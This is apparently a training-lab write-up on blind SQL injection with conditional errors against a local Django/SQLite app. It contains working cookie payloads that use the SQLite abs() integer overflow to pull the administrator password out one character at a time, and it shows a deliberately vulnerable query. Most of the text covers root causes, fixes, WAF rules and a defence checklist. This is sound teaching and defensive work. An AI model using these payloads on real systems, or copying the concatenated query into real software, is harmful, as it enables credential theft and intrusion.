# Lab 12 — Blind SQL injection with conditional errors

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors> |
| Lab id | `psw-sqli-12-blind-conditional-errors` |
| Vulnerability class | SQL Injection — blind, conditional database error as the only side channel |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18012/> |
| Flag | `FLAG{psw-sqli-12-blind-conditional-errors-admin-access}` |

### Objective

Every page load fires a tracking query that looks up the `TrackingId` cookie against the `tracked_users` table. The query result is never rendered, so a matching row and an empty row set produce byte-identical `200` responses — the usual boolean banner is absent. The only observable difference is that a database-level exception is translated into an HTTP `500` with a short generic body. The attacker must weaponise that error/no-error channel to recover the `administrator` password from the `users` table one character at a time, then sign in at `/login` to reach `/my-account` and reveal the flag.

---

## 2. Exploit walkthrough

The `TrackingId` cookie is concatenated directly into a raw SQL string. Because nothing about a *successful* query is reflected, the attacker needs a payload that maps "predicate true" to a runtime SQL exception and "predicate false" to a clean execution. On SQLite the canonical primitive is the integer overflow produced by `abs(-9223372036854775808)` — the absolute value of the most-negative signed 64-bit integer is not representable, so the function raises `integer overflow`.

Wrapping that expression in a `CASE` gates the error on a subquery over the `users` table.

**Step 1 — baseline request (benign)**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18012
Cookie: TrackingId=psw-lab-visitor-001
```

The server builds and executes:

```sql
SELECT TrackingId FROM tracked_users WHERE TrackingId = 'psw-lab-visitor-001'
```

One row matches, the query returns cleanly, and the home page renders with HTTP `200`.

**Step 2 — confirm the error-based side channel**

```http
Cookie: TrackingId=x' AND (SELECT CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -
```

Executed SQL:

```sql
SELECT TrackingId FROM tracked_users
WHERE TrackingId = 'x' AND (SELECT CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -'
```

The `CASE` takes the `THEN` branch, `abs(-9223372036854775808)` overflows, the view catches the exception and returns HTTP `500`. Flipping the predicate to `1=2` selects the `ELSE 1` branch and the response is `200`. The oracle is working: **500 = true, 200 = false**.

**Step 3 — probe password length**

```
TrackingId=x' AND (SELECT CASE WHEN (length((SELECT password FROM users WHERE username='administrator'))=8) THEN abs(-9223372036854775808) ELSE 1 END)=1-- -
```

Iterate the constant `8` until a `500` lands. The seeded admin password is eight lowercase characters (see [shop/management/commands/seed.py:34-35](shop/management/commands/seed.py#L34-L35)).

**Step 4 — extract the password character by character**

For position `n` from `1` to the length, and for each candidate character `c` in `a..z`:

```
TrackingId=x' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),<n>,1)='<c>') THEN abs(-9223372036854775808) ELSE 1 END)=1-- -
```

A `500` means the guess is correct; a `200` means it is wrong. Burp Intruder with a "Grep — Status" rule on `500` automates the sweep in seconds because the alphabet is 26 characters wide. After eight rounds the full password is recovered.

**Step 5 — authenticate and collect the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18012
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<recovered>
```

The login form itself is parameterised and safe ([shop/views.py:111](shop/views.py#L111)); there is no way around it without real credentials. After authenticating, `GET /my-account` renders the flag because the admin user's `is_admin` flag is `True` ([shop/views.py:134-137](shop/views.py#L134-L137)).

---

## 3. Vulnerable code

### Endpoint: `GET /` (tracking-cookie lookup)

[shop/views.py:58-69](shop/views.py#L58-L69)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    # Vulnerable lookup. The cookie is concatenated directly into SQL.
    # The response body and status are *identical* whether or not a row
    # matches, so no boolean banner ever renders - only a SQL error
    # leaks information, via HTTP 500.
    if tracking_id is not None:
        query = (
            "SELECT TrackingId FROM tracked_users "
            "WHERE TrackingId = '" + tracking_id + "'"
        )
```

Three things go wrong at once:

1. The `TrackingId` cookie is taken from `request.COOKIES` with no validation, no length cap, and no character allow-list.
2. Its raw value is concatenated into a SQL string with `+`, so any attacker-supplied `'`, `--`, or subquery is syntactically active.
3. The single-quote literal anchors the payload inside a string context that the attacker can trivially break out of.

[shop/views.py:70-79](shop/views.py#L70-L79)

```python
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            return HttpResponse(
                "<h1>Internal Server Error</h1>"
                "<p>An error occurred while processing your request.</p>",
                status=500,
            )
```

`cursor.execute(query)` receives a single pre-built string, so the driver has no way to distinguish code from data. The bare `except Exception` then maps **every** database-level failure — parse errors, integer overflow, divide-by-zero, type coercion — onto the same HTTP `500`. That uniform status code **is** the side channel.

### Safe counterpart for contrast

[shop/views.py:111](shop/views.py#L111)

```python
user = User.objects.filter(username=username, password=password).first()
```

The login form uses the Django ORM; parameters are bound by the query compiler, so the attacker cannot SQL-inject the login endpoint. Credential recovery is therefore forced through the cookie side channel.

### Supporting model

[shop/models.py:4-18](shop/models.py#L4-L18) — the `tracked_users` table exists only so the vulnerable query has a real relation to read from; the attacker never cares about its rows, only whether a crafted payload parses and evaluates without raising.

[shop/models.py:24-38](shop/models.py#L24-L38) — the `users` table stores the administrator password the attacker is trying to exfiltrate.

### Seeded data

[shop/management/commands/seed.py:34-35](shop/management/commands/seed.py#L34-L35) — the admin password is eight characters from `string.ascii_lowercase`, keeping the character-by-character sweep tractable for a teaching lab while still requiring a real exploit of the side channel.

[shop/management/commands/seed.py:52-56](shop/management/commands/seed.py#L52-L56) — `administrator` is the only `is_admin=True` account, so only its credentials unlock the flag path.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of an untrusted cookie into SQL** | Driver sees one opaque string; cannot separate code from data. |
| **Uniform exception handler returning HTTP 500** | Every database error collapses onto one observable status code, turning "did the query raise?" into a one-bit oracle. |
| **No rate limit on the vulnerable endpoint** | Attacker can issue the thousands of probes required to sweep an alphabet over every password position. |
| **Homepage is the vulnerable surface** | There is no authentication, CSRF token, or prior state — every unauthenticated visitor can hit the oracle. |
| **Tracking logic colocated with the page render** | The error path aborts the whole response, amplifying a tiny analytics query into an app-wide status signal. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the tracking lookup

Bind the cookie as a parameter so quotes, comments, and subqueries lose their syntactic meaning:

```python
# shop/views.py - fixed
if tracking_id is not None:
    with connection.cursor() as cursor:
        cursor.execute(
            "SELECT TrackingId FROM tracked_users WHERE TrackingId = %s",
            [tracking_id],
        )
        cursor.fetchall()
```

With the value bound, a payload like `x' AND (...)-- -` is compared *literally* against the `TrackingId` column. No row matches, no error is raised, and the oracle disappears.

### 5.2 Prefer the ORM for trivial lookups

The whole query is a single-column existence check; it does not need raw SQL:

```python
from .models import TrackedUser

if tracking_id is not None:
    TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

The ORM always binds parameters, and future maintainers cannot accidentally reintroduce concatenation.

### 5.3 Validate the cookie shape before it reaches the database

The `TrackingId` cookie is machine-generated, so its shape is known and narrow. Reject anything else before the query runs:

```python
import re

_TRACKING_ID_RE = re.compile(r"\Apsw-lab-visitor-[0-9]{3}\Z")

tracking_id = request.COOKIES.get("TrackingId")
if tracking_id is not None and not _TRACKING_ID_RE.fullmatch(tracking_id):
    tracking_id = None  # drop malformed cookie silently
```

Validation is defence-in-depth: parameterisation stops injection, validation stops malformed input from ever reaching the query layer.

### 5.4 Do not surface database errors as a distinct status

A conditional error becomes a side channel only because a raised exception produces a *different observable response* from a clean one. Collapse both paths onto the same outward behaviour:

```python
try:
    with connection.cursor() as cursor:
        cursor.execute(query, [tracking_id])
        cursor.fetchall()
except Exception:
    logger.exception("tracking lookup failed")
    # fall through - render the page exactly as on success
```

Log the exception server-side for operators, but do not return `500` for analytics failures. Tracking is best-effort; its failure should not change what the user sees.

### 5.5 Separate analytics from request rendering

The tracking lookup should not be on the critical path of the home page at all:

- Enqueue the tracking write to a background worker (Celery, RQ) or fire-and-forget HTTP call to an analytics endpoint.
- If the analytics tier goes down, the home page still serves `200`.
- The attacker can no longer influence the page response by crafting cookie values.

### 5.6 Least-privilege database role

The application account that serves `/` needs only `SELECT` on `tracked_users` and `users`. It must not have access to system tables, `ATTACH DATABASE`, `load_extension`, or write privileges outside the tables it actually uses. This does not stop conditional-error extraction by itself, but it sharply narrows what an attacker can pivot to if they find a second bug.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Detect status-code-based side channels

Conditional-error blind SQLi leaves a distinctive footprint at the edge: a single client hammering one endpoint with a cookie that oscillates between producing `200` and `500`. Catch it there:

- Emit a structured log line per request with `(client_ip, path, status, cookie_hash)`.
- Alert when a single IP produces more than `N` `500`s on `/` within a sliding window (e.g. `> 20 / 5 min`).
- Alert on a high `500`-to-`200` ratio from any single client, regardless of absolute volume — legitimate users do not provoke hundreds of server errors.
- Feed the same signal to the WAF so it can transition from monitor-only to block for that client.

### 6.2 WAF rate limiting and request inspection

Deploy a WAF (AWS WAF, Cloudflare, ModSecurity with the OWASP Core Rule Set) in front of the app:

- **Per-IP rate limit** on `/` — a typical user hits the home page a handful of times per session. Cap at e.g. `60 requests/min/IP`; drop or challenge once exceeded. Extracting an 8-character lowercase password requires `~8 * 26 = 208` probes minimum — rate limiting forces the attacker to either slow down to hours or rotate IPs, both of which are detectable.
- **Cookie inspection** — CRS rule `REQUEST-942` flags typical SQLi tokens (`CASE WHEN`, `abs(`, `SUBSTR(`, `UNION SELECT`, `--`) inside cookie headers. Cookies almost never legitimately contain these.
- **Protocol enforcement (CRS 920)** — reject cookies longer than, say, 256 bytes; the conditional-error payloads are hundreds of bytes.
- **Anomaly scoring** — combine multiple soft signals (long cookie + `'` present + burst of requests) and block above a threshold. Attackers defeat individual rules; combined scoring is much harder to evade.

A WAF is **not a substitute** for fixing the code. Treat it as one layer.

### 6.3 Network segmentation and egress control

- The database runs only on the private Docker network (see [docker-compose.yml:19-25](docker-compose.yml#L19-L25)) and is unreachable from the host except through the app.
- The app container exposes `127.0.0.1:18012:8000` in [docker-compose.yml:9-10](docker-compose.yml#L9-L10) — loopback-only binding is the first line of defence for a local lab. Production deployments should front this with a reverse proxy on a dedicated interface.
- Outbound connections from the DB container should be blocked so that a future injection escalating to `load_extension` or `ATTACH DATABASE` over a remote URI cannot reach the internet.

### 6.4 Uniform error pages

Configure the reverse proxy (nginx, Caddy, ALB) to rewrite upstream `500` responses to a canonical error page that is byte-identical regardless of upstream body. This does not fully close the channel — the status code itself is the signal — but it stops the body from leaking additional diagnostic text that a future bug might surface.

### 6.5 Monitoring and alerting

- Log every SQL exception at the application layer with full stack, query template, and bound parameters.
- Aggregate `500`-rate per endpoint and alert on sudden step changes.
- Correlate `500`s with client fingerprint (IP, user-agent, cookie) to surface single-source anomaly patterns.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere (no `+` / `%` / f-string SQL builders).
- [ ] ORM by default; raw SQL only where justified and code-reviewed.
- [ ] Input validation with an allow-list for cookies, headers, and path parameters whose shape is known.
- [ ] No observable difference between "database raised" and "database returned no rows" — collapse both onto identical status codes and response bodies.
- [ ] Analytics lookups run off the request path (background worker or async fire-and-forget).
- [ ] Separate DB role per application with least privilege (`SELECT` only on the tables actually read).
- [ ] No `load_extension`, `ATTACH DATABASE`, or filesystem primitives available to the application account.
- [ ] WAF in front of the application with per-IP rate limits and cookie/header SQLi detection.
- [ ] Structured logging of every SQL error and every `5xx` response, with alerting on unusual ratios per client.
- [ ] Regular automated SAST (`bandit`, `semgrep`) catching `cursor.execute(f"...")`, `cursor.execute("..." + x)`, and `cursor.execute("..." % x)` patterns.
- [ ] Secrets (administrator passwords) stored hashed with a modern KDF (`argon2`, `bcrypt`) so that even a full-disclosure SQLi leaks only hashes, not plaintext credentials.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- PortSwigger Web Security Academy — [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- SQLite documentation — [Core functions: `abs(X)`](https://www.sqlite.org/lang_corefunc.html#abs) (notes the integer-overflow behaviour for `-9223372036854775808`)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly) (parameter substitution warning)
- OWASP CRS — <https://coreruleset.org/>
